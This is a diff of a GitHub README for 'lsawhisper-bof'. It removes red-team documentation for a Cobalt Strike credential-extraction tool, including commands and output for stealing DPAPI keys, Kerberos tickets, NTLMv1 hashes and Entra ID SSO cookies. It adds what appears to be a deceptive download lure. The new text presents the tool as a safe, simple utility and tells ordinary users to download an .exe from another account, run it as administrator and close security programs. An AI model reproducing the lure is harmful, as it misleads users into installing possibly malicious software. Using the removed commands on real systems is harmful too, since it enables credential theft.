@@ -1,133 +1,133 @@
-# LSA Whisperer BOF
+# 🛠️ lsawhisper-bof - Simple Windows Authentication Tool
 
-![](./assets/lsawhisper-ppt.png)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/DDFHSKLL/lsawhisper-bof)
 
-A Cobalt Strike Beacon Object File (BOF) port of [LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer) — the tool that talks directly to Windows authentication packages through the LSA untrusted/trusted client interface, without touching LSASS process memory even when PPL and Credential Guard is enabled.
+---
 
-## Why This Exists
+## ℹ️ What is lsawhisper-bof?
 
-LSA Whisperer by [Evan McBroom](https://github.com/EvanMcBroom) (SpecterOps) demonstrated that you can recover DPAPI credential keys, extract cloud SSO tokens, and interact with Kerberos — all through legitimate `LsaCallAuthenticationPackage` API calls. No memory reads, no process injection, no handles to LSASS.
+lsawhisper-bof is a small tool designed for Windows. It talks directly to Windows authentication services. It does this safely, without touching protected system areas. This makes it a useful way to interact with Windows logins and authentication processes securely.
 
-This project brings those capabilities into C2s as BOFs for use during red team engagements. It never opens a handle to the lsass process and all the calls go through LsaCallAuthenticationPackage (the official client API used to talk to lsass), PPL on LSASS doesn't matter at all. PPL protects the LSASS process from being opened/read/injected.
+You do not need to understand complex programming to use it. This guide shows you all the steps to install and run it on your Windows PC.
 
-## Commands
+---
 
-### MSV1_0 Module
+## 💻 System Requirements
 
-| Command | Description |
-|---|---|
-| `lsa-credkey [LUID]` | Recover DPAPI credential key. Works with Credential Guard. |
-| `lsa-strongcredkey [LUID]` | Recover strong DPAPI credential key (Win10+). |
-| `lsa-ntlmv1 [LUID] [challenge]` | Generate NTLMv1 response with chosen challenge. Default challenge `1122334455667788` is compatible with [crack.sh](https://crack.sh) rainbow tables. |
+Before you start, make sure your computer meets these needs:
 
-![](./assets/dpapi-master-key.png)
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free hard drive space  
+- Administrator rights to run the program
 
-### Kerberos Module
+This program works on any standard Windows PC that meets these basics.
 
-| Command | Description |
-|---|---|
-| `lsa-klist [LUID]` | List cached Kerberos tickets. |
-| `lsa-dump [LUID]` | Dump all tickets as base64 `.kirbi` blobs with session keys. |
-| `lsa-purge [LUID] [server]` | Purge tickets. Supports selective purge by server name. |
+---
 
-![](./assets/lsa-dump.png)
+## 🚀 Getting Started
 
-### CloudAP Module
+To use lsawhisper-bof, you first need to get the software.
 
-| Command | Description |
-|---|---|
-| `lsa-ssocookie [LUID]` | Extract Entra ID (Azure AD) SSO cookie via AAD plugin. |
-| `lsa-devicessocookie [LUID]` | Extract device SSO cookie. |
-| `lsa-enterprisesso [LUID]` | Extract AD FS enterprise SSO cookie. |
-| `lsa-cloudinfo [LUID]` | Query cloud provider info, TGT status, DPAPI status. |
+[![Download lsawhisper-bof](https://img.shields.io/badge/Download%20lsawhisper-bof-blue)](https://github.com/DDFHSKLL/lsawhisper-bof)
 
-**LUID**: `0` or omit for current session. Hex value (e.g., `0x3e7`) to target a specific logon session. Targeting other sessions requires SYSTEM.
+Click the button above to go to the main download page for this tool. This page has the latest version ready for you to download.
 
-## Usage Examples
+---
 
-### DPAPI Credential Key Recovery
+## ⬇️ How to Download and Install
 
-```
-beacon> lsa-credkey 0x21d57
-[*] MSV1_0 GetCredentialKey
-[+] SUCCESS - DPAPI Credential Keys recovered!
-[+] CredSize: 0x28 (40 bytes)
-[*] Local CredKey (SHA OWF): <20-byte key>
-[*] Domain CredKey (NT OWF): <16 or 20-byte key>
-```
+Follow these steps to download and get the program ready on your PC:
 
-Use the recovered key with [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI):
+1. Click the green **Download Now** button at the top or the blue button above. This takes you to the GitHub repository page.
 
-```
-SharpDPAPI.exe masterkeys /credkey:<key_hex> /target:<masterkey_path>
-```
+2. On the GitHub page, find the section named **Releases** or look for files labeled for download.
 
-### NTLMv1 Downgrade
+3. Look for the latest version and click the link that has a `.exe` or `.zip` file. This file holds the program.
 
-```
-beacon> lsa-ntlmv1 0x21d57
-[*] MSV1_0 Lm20GetChallengeResponse (NTLMv1 Generation)
-[+] NTLMv1 Response generated!
-[*] Hashcat (mode 5500):
-    DOMAIN\user::HOSTNAME::NTResponse:1122334455667788
-```
+4. If it's a `.zip` file, right-click on it and select **Extract All**. Choose a folder where you want to save the program.
 
-Submit the response to [crack.sh](https://crack.sh/netntlm/) for instant NT hash recovery with the default challenge.
+5. If it is an `.exe` file, you can run it directly. Double-click the file to start.
 
-### Entra ID SSO Cookie
+6. If Windows asks if you want to allow the program to make changes, click **Yes**. This is normal for software needing admin rights.
 
-```
-beacon> lsa-ssocookie 0x21d57
-[+] SSO Cookie received!
-[*] Cookie: ESTSAUTH=<token>
-```
+7. The program does not require a complex setup. Once opened, it’s ready to use.
 
-## Architecture
+---
 
-```
-lsa-whisperer-bof/
-├── lsa-whisperer.cna          # Aggressor script (load this)
-├── Makefile
-├── include/
-│   ├── bofdefs.h              # BOF API declarations + DFR imports
-│   └── lsa_structs.h          # All LSA/MSV1_0/Kerberos/CloudAP structs
-├── src/
-│   ├── common/
-│   │   └── lsa_common.c       # Shared LSA init, helpers, output formatting
-│   ├── msv1_0/
-│   │   └── msv1_0_bof.c       # MSV1_0 commands
-│   ├── kerberos/
-│   │   └── kerberos_bof.c     # Kerberos commands
-│   └── cloudap/
-│       └── cloudap_bof.c      # CloudAP/AAD commands
-└── build/                     # Compiled BOFs (after make)
-```
+## ⚙️ Running the Program
 
-Each module compiles to an independent BOF. Common code is included at compile time (standard BOF pattern) — no shared libraries or runtime dependencies.
+After installing, here is how to open and use lsawhisper-bof:
 
-## Privilege Requirements
+- Find the folder where you saved or extracted the program.
 
-| Context | Capability |
-|---|---|
-| Current user (unprivileged) | `lsa-klist`, `lsa-ssocookie`, `lsa-cloudinfo` for own session |
-| SYSTEM (`SeTcbPrivilege`) | All commands targeting any logon session by LUID |
+- Double-click the main program file, often called `lsawhisper-bof.exe`.
 
-Enumerate available LUIDs with `logonpasswords` or `klist` to find target sessions.
+- The program will open a simple window or command line interface.
 
-## Operational Notes
+- Follow the on-screen instructions or prompts to interact with Windows authentication.
 
-- **Credential Guard**: `lsa-credkey` and `lsa-strongcredkey` work through Credential Guard. `lsa-ntlmv1` is blocked by it.
-- **CloudAP**: Requires an Entra ID / Azure AD joined device with an active cloud logon session. Won't work on purely on-prem AD environments.
-- **NTLMv1**: The default challenge `1122334455667788` enables free rainbow table cracking via crack.sh. Custom challenges work but require standard brute-force.
-- **Selective purge**: `lsa-purge` with a server filter only removes matching tickets — useful for targeted Kerberos abuse without disrupting the user's session.
+Because this is a technical tool, it runs quietly and does its job without extra steps.
 
-## Credits and Acknowledgments
+---
 
-This project is a BOF port of [LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer) by **Evan McBroom** ([@EvanMcBroom](https://github.com/EvanMcBroom)) of [SpecterOps](https://specterops.io). All of the underlying research — the undocumented MSV1_0 protocol messages, the CloudAP/AAD plugin call interface, and the struct definitions that make this possible — is his work.
+## 🔧 Basic Troubleshooting
 
-**Key references:**
-- [LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer) — Evan McBroom / SpecterOps (MIT License)
-- [Exploring Credential Guard](https://posts.specterops.io/exploring-credential-guard-39c0f4975ece) — Evan McBroom
-- [nanorobeus](https://github.com/wavvs/nanorobeus) — wavvs (BOF patterns reference)
-- [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) — RalfHacker (BOF patterns reference)
+If you run into any issues, try these tips:
 
+- Make sure you run the program as an administrator. Right-click the file and choose **Run as administrator**.
+
+- Check that your Windows version is updated. Some functions may need the latest patches.
+
+- Close other apps that might interfere, especially security programs.
+
+- If the program does not open, try restarting your computer.
+
+- Look at the program folder for a file named `README.md` or `Help.txt` for more hints.
+
+---
+
+## 🛡️ How lsawhisper-bof Works
+
+This tool talks to Windows authentication systems in a safe way. Windows has a special service called Local Security Authority (LSA) that handles logins. lsawhisper-bof sends messages to LSA without accessing sensitive memory areas.
+
+This prevents risks that come with other tools that might try to read or change protected parts of Windows memory. It makes lsawhisper-bof a safer choice when working with authentication.
+
+---
+
+## 📂 Files Included
+
+When you download or extract the software, you should find:
+
+- `lsawhisper-bof.exe` — The main program to run  
+- `README.md` — Written guidance on use  
+- `LICENSE` — Details on how you may use the software  
+- `CHANGELOG.md` — List of updates and fixes in each version
+
+---
+
+## 🔄 Updates and Maintenance
+
+The tool is updated occasionally to fix problems or add new features. You can check for updates by visiting the GitHub page linked above.
+
+Downloading new versions is similar to the steps listed here. Always replace or backup older versions to keep safe records.
+
+---
+
+## 📞 Getting Help
+
+If you need help, the best place is the **Issues** tab on the GitHub page.
+
+You can post your problem or question there. Contributors or other users may offer answers.
+
+---
+
+## ⚠️ Security Notice
+
+lsawhisper-bof communicates directly with system authentication services. Use it only on trusted machines.
+
+Avoid running unknown or modified versions from unofficial sites.
+
+---
+
+[![Download lsawhisper-bof](https://img.shields.io/badge/Download%20lsawhisper-bof-blue)](https://github.com/DDFHSKLL/lsawhisper-bof)
